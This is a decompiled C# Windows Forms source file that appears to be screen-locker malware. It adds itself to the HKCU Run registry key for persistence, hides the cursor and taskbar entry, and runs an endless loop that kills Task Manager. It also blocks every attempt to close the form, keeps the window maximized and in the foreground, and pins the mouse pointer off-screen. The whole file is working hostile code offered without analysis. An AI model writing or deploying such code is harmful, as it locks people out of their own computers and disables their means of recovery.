using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;
using svpps.xyz.Properties;

namespace svpps.xyz
{
	// Token: 0x02000002 RID: 2
	public partial class Form1 : Form
	{
		// Token: 0x06000001 RID: 1 RVA: 0x00002050 File Offset: 0x00000250
		public Form1()
		{
			this.InitializeComponent();
			Cursor.Hide();
			this.timer2.Start();
			base.FormBorderStyle = FormBorderStyle.None;
			base.ShowInTaskbar = false;
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\Currentversion\\Run", true);
			registryKey.SetValue("My appication", Application.ExecutablePath.ToString());
			Thread thread = new Thread(new ThreadStart(Form1.killTaskMgr));
			thread.Start();
		}

		// Token: 0x06000002 RID: 2 RVA: 0x000020D8 File Offset: 0x000002D8
		private static void killTaskMgr()
		{
			while (true)
			{
				try
				{
					Process[] processesByName = Process.GetProcessesByName("Taskmgr");
					bool flag = processesByName != null;
					if (flag)
					{
						Process[] array = processesByName;
						int num = 0;
						if (num < array.Length)
						{
							Process process = array[num];
							process.Kill();
						}
					}
					Application.DoEvents();
				}
				catch
				{
				}
			}
		}

		// Token: 0x06000006 RID: 6 RVA: 0x0000217A File Offset: 0x0000037A
		private void preventClose(object sender, FormClosingEventArgs e)
		{
			e.Cancel = true;
		}

		// Token: 0x06000008 RID: 8
		[DllImport("user32.dll")]
		[return: MarshalAs(UnmanagedType.Bool)]
		private static extern bool SetForegroundWindow(IntPtr hWnd);

		// Token: 0x06000005 RID: 5 RVA: 0x00002154 File Offset: 0x00000354
		private void timer1_Tick(object sender, EventArgs e)
		{
			bool flag = base.WindowState != FormWindowState.Maximized;
			if (flag)
			{
				base.WindowState = FormWindowState.Maximized;
			}
		}

		// Token: 0x06000007 RID: 7 RVA: 0x00002185 File Offset: 0x00000385
		private void timer2_Tick(object sender, EventArgs e)
		{
			this.mPosition.X = 1000;
			this.mPosition.Y = 3000;
			Cursor.Position = this.mPosition;
		}

		// Token: 0x06000009 RID: 9 RVA: 0x000021B6 File Offset: 0x000003B6
		private void timer3_Tick(object sender, EventArgs e)
		{
			Form1.SetForegroundWindow(base.Handle);
		}

		// Token: 0x17000001 RID: 1
		public bool Enable
		{
			// Token: 0x06000003 RID: 3 RVA: 0x00002140 File Offset: 0x00000340
			get;
			// Token: 0x06000004 RID: 4 RVA: 0x00002148 File Offset: 0x00000348
			private set;
		}

		// Token: 0x04000001 RID: 1
		private Point mPosition;
	}
}
